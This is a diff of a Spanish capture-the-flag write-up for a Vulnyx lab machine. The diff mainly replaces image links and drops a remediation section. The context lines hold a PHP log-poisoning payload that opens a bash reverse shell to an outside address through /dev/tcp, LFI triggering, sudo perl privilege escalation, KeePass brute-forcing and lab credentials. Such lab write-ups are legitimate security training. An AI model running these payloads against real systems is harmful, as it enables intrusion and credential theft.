@@ -222,7 +222,7 @@ curl -sX GET -x "http://192.168.0.15:3128" "http://127.0.0.1:80" \
   -A "<?php system('bash -c \"bash -i >& /dev/tcp/192.168.0.13/443 0>&1\"'); ?>"
 ```
 
-![Inyección de la reverse shell](images/inyeccion_de_reverse_shell.png)
+<img width="483" height="442" alt="inyeccion de reverse shell" src="https://github.com/user-attachments/assets/cebea860-9338-4b09-b6cc-4fefdf761361" />
 
 Disparo incluyendo el log envenenado:
 
@@ -230,7 +230,7 @@ Disparo incluyendo el log envenenado:
 curl -s "http://192.168.0.15/page.php?i=/var/log/squid/access.log"
 ```
 
-![Disparo de la inyección](images/disparo_la_inyeccion_para_obtener_reverseshell.png)
+<img width="594" height="50" alt="disparo la inyeccion para obtener reverseshell" src="https://github.com/user-attachments/assets/83ca927c-b72c-4b67-93c1-a1a3fc78719f" />
 
 **Resultado:** shell como **`www-data`**.
 
@@ -239,7 +239,7 @@ curl -s "http://192.168.0.15/page.php?i=/var/log/squid/access.log"
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 ```
 
-![Obtención de la reverse shell](images/obtengo_la_reverse_shell.png)
+<img width="484" height="259" alt="obtengo la reverse shell" src="https://github.com/user-attachments/assets/ff2a5861-0951-43ed-ac98-e8c5d7d82944" />
 
 ---
 
@@ -254,7 +254,7 @@ sudo -l
 # (dorian) NOPASSWD: /usr/bin/perl
 ```
 
-![Permisos sudo: perl como dorian](images/Enumero_permisos_sudo_y_encuentro_archivo_perl_de_dorian.png)
+<img width="474" height="181" alt="Enumero permisos sudo y encuentro archivo perl de dorian" src="https://github.com/user-attachments/assets/90ef61f3-1741-4bd7-ad4a-cf321df45dda" />
 
 **Resultado:** abuso vía [GTFOBins](https://gtfobins.github.io/gtfobins/perl/) para obtener shell como dorian y leer la primera flag.
 
@@ -265,11 +265,11 @@ cat /home/dorian/user.txt
 # 97c62ffbfe2e1c78d8048ae2a699619a
 ```
 
-![Shell como dorian y user.txt](images/Ejecuto_shell_como_Dorian_y_obtengo_flag_usertxt.png)
+<img width="477" height="249" alt="image" src="https://github.com/user-attachments/assets/6ede43d4-7498-4a2c-819c-74e4e768d01f" />
 
 > Nota: desde `www-data` el directorio `/home/dorian` tiene permisos restrictivos y la `user.txt` no es accesible hasta pivotar al usuario.
 
-![Sin permisos para acceder al home de dorian](images/sin_permisos_para_acceder_a_directori_ode_dorian.png)
+<img width="346" height="176" alt="sin permisos para acceder a directori ode dorian" src="https://github.com/user-attachments/assets/4071ab48-ca94-4f2f-b431-e97c6a4145b1" />
 
 ### 4.2 Enumeración como dorian: backup KeePass
 
@@ -279,7 +279,7 @@ cat /home/dorian/user.txt
 cd ~ && ls -la
 ```
 
-![Archivos ocultos: directorio .bak](images/Listo_archivos_ocultos_de_ldirectori_ode_dorian_y_encuentor_un_backup.png)
+<img width="475" height="201" alt="Listo archivos ocultos de ldirectori ode dorian y encuentor un backup" src="https://github.com/user-attachments/assets/52356508-68fc-4bb3-ad54-0fa2d3864929" />
 
 ```bash
 cd ~/.bak && ls -la
@@ -287,7 +287,7 @@ file data.txt
 # data.txt: Keepass password database 2.x KDBX
 ```
 
-![data.txt dentro del backup](images/Encuentro_un_datatxt_dentr_odel_backup_de_dorian.png)
+<img width="477" height="161" alt="Encuentro un datatxt dentr odel backup de dorian" src="https://github.com/user-attachments/assets/9e501e21-a20c-4c57-8bea-add921aea143" />
 
 **Resultado:** base de datos **KeePass (KDBX)**. Candidata a contener credenciales de root.
 
@@ -300,7 +300,7 @@ file data.txt
 python3 -m http.server 1234
 ```
 
-![Servidor python en la víctima](images/Ejecuto_server_python_en_maquina_victima_para_servir_el_archivo.png)
+<img width="479" height="114" alt="Ejecuto server python en maquina victima para servir el archivo" src="https://github.com/user-attachments/assets/c226660c-964b-4e55-97b2-aed0fd71f657" />
 
 ```bash
 # en Kali
@@ -309,13 +309,13 @@ mv data.txt data.kdbx
 file data.kdbx    # Keepass password database 2.x KDBX
 ```
 
-![Descarga de data.txt](images/Descarga_de_archivo_datatxt_exitosa.png)
+<img width="482" height="202" alt="Descarga de archivo datatxt exitosa" src="https://github.com/user-attachments/assets/8e369cab-66a4-40e9-bb9d-ba5ecf315d22" />
 
-![Renombrado a .kdbx](images/renombramiento_de_archivo_datatxt_a_extensio_nde_backup.png)
+<img width="247" height="25" alt="renombramiento de archivo datatxt a extensio nde backup" src="https://github.com/user-attachments/assets/7bb3a1e6-111a-42d1-a59f-a2eb1181dde0" />
 
 El contenido binario no es legible directamente:
 
-![Símbolos raros al abrirlo](images/Simbolos_raros_al_intentar_abrirlo.png)
+<img width="481" height="439" alt="Simbolos raros al intentar abrirlo" src="https://github.com/user-attachments/assets/c7374709-2bd2-4813-aa64-3790a808176f" />
 
 **Problema:** se trata de un **KDBX 4 (Argon2)**, no soportado por `keepass2john`:
 
@@ -333,9 +333,9 @@ cd keepass4brute
 ./keepass4brute.sh ../data.kdbx /usr/share/wordlists/rockyou.txt
 ```
 
-![Requisitos para keepass4brute](images/Instalacion_requerimientos_para_instalar_keepass4brute.png)
+<img width="471" height="118" alt="Instalacion requerimientos para instalar keepass4brute" src="https://github.com/user-attachments/assets/509728da-5e40-40c8-acbb-4281d2627f9e" />
 
-![Clonado del repo y fuerza bruta](images/Clonacio_nde_repo_keepass4brute_y_fuerza_bruta.png)
+<img width="473" height="551" alt="Clonacio nde repo keepass4brute y fuerza bruta" src="https://github.com/user-attachments/assets/f2b23567-190e-43d7-9cd9-f0d2aab07522" />
 
 **Resultado:** recuperada la *master password*, se abre la base con KeePassXC y se obtiene la credencial del usuario **root**:
 
@@ -344,7 +344,7 @@ Usuario:  root
 Password: r00tB0$$123!
 ```
 
-![KeePassXC abierto con la clave de root](images/Abro_Keepass_con_la_contrase_a_encontrada_y_obtengo_clave_de_root.png)
+<img width="793" height="572" alt="image" src="https://github.com/user-attachments/assets/1d3c60f5-6c26-4d48-bc82-8bb5cfe1941d" />
 
 ### 4.4 dorian → root
 
@@ -363,7 +363,8 @@ cat /root/root.txt
 # 3ba0b1d7e2e14ffd1f5b9788aa957bfd
 ```
 
-![Acceso SSH como root y root.txt](images/Ingreso_con_usuario_root_mediante_ssh_y_obtengo_flag_roottxt.png)
+<img width="475" height="330" alt="image" src="https://github.com/user-attachments/assets/c38e2107-1134-41e4-b7c2-4ac02fd12d6f" />
+
 
 ---
 
@@ -381,17 +382,3 @@ nmap (22/80/3128)
                                              └── ssh root@victima → root + root.txt
 ```
 
----
-
-## 6. Remediación
-
-- **LFI / `page.php`:** validar el parámetro contra una *allow-list* de archivos permitidos en lugar de una blacklist de patrones. No construir rutas de inclusión a partir de entrada del usuario.
-- **WAF por blacklist:** las listas negras son evadibles (rutas absolutas, codificaciones). Reemplazar por validación positiva y `open_basedir`/permisos estrictos sobre el webroot.
-- **Squid:** restringir el acceso al proxy (ACLs) para que no permita peticiones a `127.0.0.1`, y no exponer sus logs a rutas incluibles.
-- **sudo:** eliminar la regla `(dorian) NOPASSWD: /usr/bin/perl`; un intérprete permite ejecución arbitraria de comandos.
-- **Credenciales:** no almacenar bases KeePass con contraseñas débiles (crackeable por diccionario) ni dejar backups accesibles en directorios de usuario.
-- **SSH root:** deshabilitar `PermitRootLogin` y forzar autenticación por clave.
-
----
-
-*Writeup por [rodrigoquintanasec](https://github.com/rodrigoquintanasec) — Vulnyx Labs.*
